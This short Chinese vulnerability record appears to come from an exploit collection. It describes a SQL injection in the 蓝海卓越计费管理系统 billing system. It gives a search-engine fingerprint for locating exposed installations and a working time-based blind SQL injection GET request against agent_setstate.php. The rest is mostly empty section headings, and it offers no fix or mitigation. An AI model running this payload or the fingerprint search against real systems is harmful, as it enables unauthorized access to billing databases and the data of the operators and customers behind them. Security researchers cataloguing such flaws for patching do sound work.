# 蓝海卓越计费管理系统agent_setstat存在SQL注入漏洞

- **系统**：蓝海卓越计费管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="蓝海卓越计费管理系统"`
- **请求**：`GET /agent_setstate.php?id=1+AND+(SELECT+4964+FROM+(SELECT(if(length(database())=6,sleep(3),1)))uQqn) HTTP/1.1`
- **关键头**：`Content-Length: 161`

**请求体 / payload**
```

```

**其他**
- 蓝海卓越计费管理系统agent\_setstat存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝海卓越 计费管理系统